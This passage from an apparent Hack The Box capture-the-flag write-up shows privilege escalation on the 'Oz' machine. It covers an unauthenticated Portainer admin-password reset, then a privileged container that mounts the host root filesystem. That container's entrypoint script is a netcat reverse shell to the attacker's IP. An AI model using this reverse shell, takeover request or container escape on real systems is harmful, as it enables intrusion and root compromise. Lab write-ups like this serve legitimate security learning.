            "c26a7bc669289e40144fa1ad25546f38e4349d964b7b3d4fea13e15fe5a9fb01": {
                "Name": "tix-app",
                "EndpointID": "73701fde20003bd373653d4f1eb9d84ed5f04f987958d167112e899e585d8450",
                "MacAddress": "02:42:0a:64:0a:02",
                "IPv4Address": "10.100.10.2/29",
                "IPv6Address": ""
            }
        },
        "Options": {},
        "Labels": {}
    }
]
dorthi@Oz:~$ sudo /usr/bin/docker network inspect bridge
[
    {
        "Name": "bridge",
        "Id": "de829e4867228adc17d5544fda536ff9329f03fefa29d5828b6cade710ec15df",
        "Created": "2018-09-02T17:04:14.75249885-05:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": null,
            "Config": [
                {
                    "Subnet": "172.17.0.0/16",
                    "Gateway": "172.17.0.1"
                }
            ]
        },
        "Internal": false,
        "Attachable": false,
        "Containers": {
            "e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14": {
                "Name": "portainer-1.11.1",
                "EndpointID": "4f616ad115d5cc9daa5c780a48cfe88018d372ce9073e5e9c1929b0a09db693f",
                "MacAddress": "02:42:ac:11:00:02",
                "IPv4Address": "172.17.0.2/16",
                "IPv6Address": ""
            }
        },
        "Options": {
            "com.docker.network.bridge.default_bridge": "true",
            "com.docker.network.bridge.enable_icc": "true",
            "com.docker.network.bridge.enable_ip_masquerade": "true",
            "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
            "com.docker.network.bridge.name": "docker0",
            "com.docker.network.driver.mtu": "1500"
        },
        "Labels": {}
    }
]
```

So, we've just identified another container `portainer-1.11.1` running on `172.17.0.2`.

Looking at the documentation for portainer, we find that it's running on port `9000`.

We'll do some SSH port forwarding to get access to the container from our Kali box:

`ssh -R 9000:172.17.0.2:9000 root@10.10.14.23`

```
dorthi@Oz:~$ ssh -R 9000:172.17.0.2:9000 root@10.10.14.23
The authenticity of host '10.10.14.23 (10.10.14.23)' can't be established.
ECDSA key fingerprint is SHA256:9Oo1eYyjWeG8wM9Diog9J/MlNRpaj8qEy9n8FmKIhf4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.14.23' (ECDSA) to the list of known hosts.
root@10.10.14.23's password: 
Linux darkisland 4.17.0-kali3-amd64 #1 SMP Debian 4.17.17-1kali1 (2018-08-21) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep  2 15:41:23 2018 from 10.10.10.96
```

![](/assets/images/htb-writeup-oz/12.png)

![](/assets/images/htb-writeup-oz/13.png)

![](/assets/images/htb-writeup-oz/14.png)

There's a way to change the admin user password:

[https://github.com/portainer/portainer/issues/493](https://github.com/portainer/portainer/issues/493)

```
Steps to reproduce the issue:

Run portainer
POST to /api/users/admin/init with json [password: mypassword]
login with this password
POST to /api/users/admin/init with json [password: myotherpassword] without Authorization header
Login with mypassword is impossible
Login with myotherpassword is possible
```

![](/assets/images/htb-writeup-oz/15.png)

So we can change the password of admin to one of our choosing.

Now we can log in:

![](/assets/images/htb-writeup-oz/16.png)

![](/assets/images/htb-writeup-oz/17.png)

So we can now stop/restart/create containers.

The plan is to create a new container using an existing image, launch it as privileged, mount the local host OS root directory within the container so we can read the root flag.

- Create the entrypoint shell script that will be run when container starts and then give us a reverse shell

```
dorthi@Oz:/tmp$ cat run.sh
#!/bin/sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 5555 >/tmp/f
```

- Create a new container running as privileged (we use one of the existing image on the box)

![](/assets/images/htb-writeup-oz/18.png)

![](/assets/images/htb-writeup-oz/19.png)

![](/assets/images/htb-writeup-oz/20.png)

![](/assets/images/htb-writeup-oz/21.png)

- Catch the reverse shell and get the root flag

```
root@darkisland:/tmp# nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.96] 42233
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/mnt/root/root # cat root.txt
abaa95<redacted>
```